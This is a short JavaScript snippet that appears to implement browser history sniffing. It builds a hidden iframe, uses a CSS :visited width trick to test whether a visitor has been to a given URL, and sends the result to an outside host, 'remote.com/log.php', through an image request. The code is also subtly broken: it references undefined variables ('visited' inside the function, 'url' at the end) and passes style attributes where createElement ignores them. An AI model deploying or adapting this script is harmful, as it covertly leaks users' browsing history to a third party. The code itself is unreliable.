
function hasVisited(url) {
    var result = "not visited"
    var iframe = document.createElement('iframe', { width: '1px', height: '1px', style: 'visibility:hidden;'});   
    document.body.appendChild(iframe);
    var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
    ifdoc.open();
    ifdoc.write('<style>a:visited{width:0px !important;}</style>');
    ifdoc.close();
    var count = 0;
    var u = url;
    var success = false;
    var a = ifdoc.createElement('a');
    a.href = u;
    ifdoc.body.appendChild(a);
    var width = null;
    (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
    if (width == '0px') { 
        result = visited;
    }
    document.body.removeChild(iframe);
    return result;
}

var visited = hasVisited('http://site/page');
new Image().src = 'http://remote.com/log.php?'+encodeURI(url)+'='+encodeURI(visited);


